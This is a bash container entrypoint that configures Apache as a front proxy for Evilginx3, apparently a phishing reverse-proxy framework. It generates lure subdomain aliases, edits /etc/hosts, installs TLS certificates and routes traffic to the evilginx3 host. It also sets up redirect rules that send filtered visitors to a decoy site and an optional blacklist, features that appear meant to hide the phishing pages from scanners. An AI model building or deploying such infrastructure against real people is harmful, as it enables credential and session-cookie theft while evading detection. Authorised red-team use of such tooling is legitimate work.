#!/bin/bash

evilginx3_cstring=""
for esub in $EVILGINX3_SUBS; do
    evilginx3_cstring+="${esub}.${ROOT_DOMAIN} "
done

if [[ "${E_ROOT_BOOL}" == "true" ]]; then
    evilginx3_cstring+="${ROOT_DOMAIN}"
fi

apache_ip=$(getent hosts apache | awk '{print $1}')
echo "${apache_ip} ${evilginx3_cstring}${ROOT_DOMAIN}" >> /etc/hosts

if [[ "${BL_BOOL}" == "true" ]]; then
    sed "s|ServerAlias evilginx3.template|ServerAlias ${evilginx3_cstring}|g" /app/conf/000-default.conf.template > /etc/apache2/sites-enabled/000-default.conf
else 
    sed "s|ServerAlias evilginx3.template|ServerAlias ${evilginx3_cstring}|g" /app/conf/000-default-no-bl.conf.template > /etc/apache2/sites-enabled/000-default.conf
fi

sed -i "s|SSLCertificateFile.*|SSLCertificateFile /app/certs/fullchain.pem|g" /etc/apache2/sites-enabled/000-default.conf    
sed -i "s|SSLCertificateKeyFile.*|SSLCertificateKeyFile /app/certs/privkey.pem|g" /etc/apache2/sites-enabled/000-default.conf
sed -i "s|127\.0\.0\.1|evilginx3|g" /etc/apache2/sites-enabled/000-default.conf
sed -i "s|Listen 80||g" /etc/apache2/ports.conf

sed "s|https://en.wikipedia.org/|${REDIRECT_URL}|g" /app/conf/redirect.rules.template > /etc/apache2/redirect.rules

if [[ "${BL_BOOL}" == "true" ]]; then
    cp /app/conf/blacklist.conf /etc/apache2/
fi

$@
